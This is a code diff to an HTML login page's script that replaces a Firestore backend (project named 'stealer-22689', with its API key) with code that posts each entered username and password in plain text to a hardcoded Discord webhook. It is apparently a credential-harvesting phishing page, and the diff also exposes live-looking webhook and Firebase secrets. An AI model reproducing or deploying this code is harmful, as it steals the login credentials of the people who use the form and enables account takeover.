@@ -92,68 +92,51 @@
     <div id="message"></div>
   </div>
 
-  <!-- Firebase UMD SDKs (must load BEFORE your script) -->
-  <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-firestore-compat.js"></script>
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1380741256476491949/nkiZtYE_0FXuYuHNliPq2zS8c4FjCLt2iIzpzve9BONiS19Nxr6WEpcATJjJeqX1y3sd";
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyAQlPoupRMYE9_4Sli4-ZFjGJEyhnJWpQU",
-      authDomain: "stealer-22689.firebaseapp.com",
-      projectId: "stealer-22689",
-      storageBucket: "stealer-22689.firebasestorage.app",
-      messagingSenderId: "794872608041",
-      appId: "1:794872608041:web:931ab0b75aee3ec67c7338",
-      measurementId: "G-HTDSYH71XK"
-    };
+  const usernameInput = document.getElementById("username");
+  const passwordInput = document.getElementById("password");
+  const saveBtn = document.getElementById("saveBtn");
+  const messageDiv = document.getElementById("message");
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+  function showMessage(msg, error = false) {
+    messageDiv.textContent = msg;
+    messageDiv.style.color = error ? "#ff4444" : "#00aaff";
+  }
 
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
-    const saveBtn = document.getElementById("saveBtn");
-    const messageDiv = document.getElementById("message");
+  saveBtn.addEventListener("click", async () => {
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
 
-    function showMessage(msg, error = false) {
-      messageDiv.textContent = msg;
-      messageDiv.style.color = error ? "#ff4444" : "#00aaff";
+    if (!username || !password) {
+      showMessage("Please enter username and password.", true);
+      return;
     }
 
-    saveBtn.addEventListener("click", async () => {
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
+    showMessage("Sending credentials...");
 
-      if (!username || !password) {
-        showMessage("Please enter username and password.", true);
-        return;
-      }
+    try {
+      const content = `**New Login Info**\nUsername: \`${username}\`\nPassword: \`${password}\``;
 
-      showMessage("Checking username availability...");
+      const response = await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content }),
+      });
 
-      try {
-        const usersRef = db.collection("users");
-        const snapshot = await usersRef.where("username", "==", username).get();
-
-        if (!snapshot.empty) {
-          showMessage("Username already taken, try a different one.", true);
-          return;
-        }
-
-        await usersRef.add({
-          username: username,
-          password: password,
-          createdAt: new Date().toISOString()
-        });
-
-        showMessage("Credentials saved successfully!");
+      if (response.ok) {
+        showMessage("Credentials sent successfully!");
         usernameInput.value = "";
         passwordInput.value = "";
-      } catch (error) {
-        showMessage("Error: " + error.message, true);
-        console.error("Firestore error:", error);
+      } else {
+        showMessage("Failed to send credentials.", true);
       }
-    });
-  </script>
+    } catch (error) {
+      showMessage("Error sending credentials: " + error.message, true);
+      console.error(error);
+    }
+  });
+</script>
 </body>
 </html>
